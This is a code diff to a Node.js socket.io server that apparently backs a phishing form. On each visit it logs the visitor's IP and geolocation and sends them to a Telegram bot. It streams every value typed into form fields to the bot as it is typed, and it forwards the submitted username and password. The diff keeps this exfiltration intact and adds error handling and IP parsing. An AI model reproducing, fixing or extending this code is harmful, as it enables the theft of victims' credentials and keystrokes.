@@ -20,7 +20,7 @@ function sendTelegram(message){
     axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
         chat_id: CHAT_ID,
         text: message
-    });
+    }).catch(err => console.log("Telegram Error:", err.message));
 }
 
 async function getLocation(ip){
@@ -41,31 +41,34 @@ io.on("connection", async (socket)=>{
 
     console.log("User opened the form");
 
-    let ip =
-        socket.handshake.headers["x-forwarded-for"] ||
-        socket.handshake.address;
+    let ip = socket.handshake.headers["x-forwarded-for"] 
+          || socket.conn.remoteAddress 
+          || socket.handshake.address;
 
-    if (ip && ip.includes(",")) {
-        ip = ip.split(",")[0];
+    if(ip){
+        ip = ip.split(",")[0].replace("::ffff:", "");
     }
 
-    if (ip) {
-        ip = ip.replace("::ffff:", "");
-    }
+    console.log("Detected IP:", ip);
 
     const location = await getLocation(ip);
 
-    console.log("IP:", ip);
     console.log("Location:", location);
 
-    sendTelegram(`⚠️ New Visitor on Your Site\nIP: ${ip}\nLocation: ${location}`);
+    sendTelegram(`⚠️ New Visitor
+IP: ${ip}
+Location: ${location}`);
 
     socket.on("typing",(data)=>{
-        sendTelegram(`Typing\nField: ${data.field}\nValue: ${data.value}`);
+        sendTelegram(`Typing
+Field: ${data.field}
+Value: ${data.value}`);
     });
 
     socket.on("submit",(data)=>{
-        sendTelegram(`✅ Final Submission\nUsername: ${data.username}\npassword: ${data.password}`);
+        sendTelegram(`✅ Final Submission
+Username: ${data.username}
+Password: ${data.password}`);
     });
 
 });
